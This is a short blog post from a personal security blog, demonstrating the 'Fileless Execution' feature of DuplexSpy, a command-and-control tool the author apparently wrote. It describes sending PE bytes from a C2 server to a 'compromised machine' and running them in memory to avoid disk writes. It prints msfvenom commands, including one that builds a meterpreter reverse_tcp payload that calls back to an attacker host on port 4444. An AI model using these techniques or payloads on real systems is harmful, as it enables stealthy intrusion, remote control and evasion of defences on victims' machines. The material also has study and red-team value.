<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[DuplexSpy] Fileless Execution | ISSAC/iss4cf0ng's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[DuplexSpy] Fileless Execution</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-02-03T15:42:02.000Z" id="date"> 2026-02-03</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-02-18T06:33:08.798Z" id="updated"> 2026-02-18</time></div></span><br><span>Word Count: <div class="control">285</div></span><br><span>Read Time: <div class="control">1 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the <strong>Fileless Execution</strong> feature of DuplexSpy.</p>
<p>This feature allows you to execute a PE (Portable Executable) file on a compromised machine without writing it to disk.</p>
<h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The C2 server sends raw PE file bytes to the compromised machine. The DuplexSpy payload loads these PE bytes into memory and executes them. When the payload receives a fileless execution command, it creates a new process to execute the PE entirely from memory.</p>
<p>The figure below illustrates the execution flow:</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/procedure.svg'><img src="/images/article/tools/duplexspy/fileless/procedure.svg" width="1000">
</p>

<p>The x64 version of PE loader is based on the implementation by <a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">Casey Smith</a>. However, I have developed the <a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/dotNetPELoader">x86 version</a> in case the C# payload uses the x86 platform.</p>
<p>Note that a loader can only execute PE files that match its architecture. An x64 loader cannot execute x86 PE files and vice versa. Make sure you identify the architecture of the target PE and select the matched loader.</p>
<p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="300">
</p>

<h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Example-1-x64-msfvenom"><a href="#Example-1-x64-msfvenom" class="headerlink" title="Example 1 - x64 msfvenom"></a>Example 1 - x64 msfvenom</h2><p>First, check the architecture of the executed payload:</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.1.png'><img src="/images/article/tools/duplexspy/fileless/check.1.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.2.png'><img src="/images/article/tools/duplexspy/fileless/check.2.png" width="700">
</p>

<p>Generate an x64 Messagebox payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/x64/messagebox TEXT=&quot;msf hello world&quot; -f exe &gt; x64.exe<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.1.png'><img src="/images/article/tools/duplexspy/fileless/msf.1.png" width="700">
</p>

<p>The <code>x64.exe</code> is executed successfully without being written to disk. This is fileless execution. Next, check the process list:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tasklist | find &quot;client.exe&quot;<br></code></pre></td></tr></table></figure>
<p>Here <code>client.exe</code> is your DuplexSpy payload.</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.2.png'><img src="/images/article/tools/duplexspy/fileless/msf.2.png" width="700">
</p>

<p>Two instance of <code>client.exe</code> (the DuplexSpy payload) are running. One instance maintains communication with the C2 server, while the other is for executing the filesless payload.</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.3.png'><img src="/images/article/tools/duplexspy/fileless/msf.3.png" width="700">
</p>

<h2 id="Example-2-x86-meterpreter"><a href="#Example-2-x86-meterpreter" class="headerlink" title="Example 2 - x86 meterpreter"></a>Example 2 - x86 meterpreter</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 lhost=192.168.1.192 lport=4444 -f exe -a x86 &gt; x86.exe<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.4.png'><img src="/images/article/tools/duplexspy/fileless/msf.4.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.5.png'><img src="/images/article/tools/duplexspy/fileless/msf.5.png" width="700">
</p>


<h2 id="Example-3-x86-calc-exe"><a href="#Example-3-x86-calc-exe" class="headerlink" title="Example 3 - x86 calc.exe"></a>Example 3 - x86 calc.exe</h2><p>Now, try executing a more complex application:</p>
<p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/calc.1.png'><img src="/images/article/tools/duplexspy/fileless/calc.1.png" width="500">
</p>

<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="500">
</p><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2026/02/06/2026-2-6-ToolDotNetPELoader/">← Next [Tools] dotNetPELoader——A C# PE loader for x64 and x86 PE files.</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/02/03/2026-2-3-DuplexSpyProxy/">[DuplexSpy] SOCKS5 Proxy Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://gist.github.com/iss4cf0ng/"><i class="fab fa-code" alt="Gist"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Principle"><span class="toc-number">2.</span> <span class="toc-text">Principle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Started"><span class="toc-number">3.</span> <span class="toc-text">Getting Started</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-x64-msfvenom"><span class="toc-number">3.1.</span> <span class="toc-text">Example 1 - x64 msfvenom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-x86-meterpreter"><span class="toc-number">3.2.</span> <span class="toc-text">Example 2 - x86 meterpreter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-x86-calc-exe"><span class="toc-number">3.3.</span> <span class="toc-text">Example 3 - x86 calc.exe</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">4.</span> <span class="toc-text">THANKS FOR READING!</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>